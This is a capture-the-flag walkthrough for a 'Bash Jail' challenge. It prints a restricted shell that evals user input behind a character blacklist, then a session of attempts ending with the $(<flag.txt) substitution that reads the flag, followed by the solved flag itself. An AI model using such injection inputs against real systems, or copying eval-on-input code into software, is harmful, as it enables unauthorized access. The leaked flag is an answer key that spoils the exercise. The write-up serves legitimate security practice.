# Bash Jail 2

__PROBLEM__

 User: level2
Password is the previous jail challenge flag

__SOLUTION__

```bash
➜ ssh level2@challenges.ringzer0team.com -p 10218
level2@challenges.ringzer0team.com password:

RingZer0 Team Online CTF

BASH Jail Level 2:
Current user is uid=1001(level2) gid=1001(level2) groups=1001(level2)

Flag is located at /home/level2/flag.txt

Challenge bash code:
-----------------------------

function check_space {
        if [[ $1 == *[bdks';''&'' ']* ]]
        then
                return 0
        fi

        return 1
}

while :
do
        echo "Your input:"
        read input
        if check_space "$input"
        then
                echo -e '\033[0;31mRestricted characters has been used\033[0m'
        else
                output="echo Your command is: $input"
                eval $output
        fi
done

-----------------------------
Your input:
/bin/bash
Restricted characters has been used
Your input:
ls
Restricted characters has been used
Your input:
LS
Your command is: LS
Your input:
ls
Restricted characters has been used
Your input:
LS
Your command is: LS
Your input:
CAT
Your command is: CAT
Your input:
$(flag.txt)
/home/level2/prompt.sh: line 38: flag.txt: command not found
Your command is:
Your input:
$(cat ls)
Restricted characters has been used
Your input:
$(ls)
Restricted characters has been used
Your input:
$(<flag.txt)
Your command is: FLAG-a78i8TFD60z3825292rJ9JK12gIyVI5P
Your input:
```
To Know why `$()` worked see: https://stackoverflow.com/questions/27472540/difference-between-and-in-bash

FLAG - `FLAG-a78i8TFD60z3825292rJ9JK12gIyVI5P`
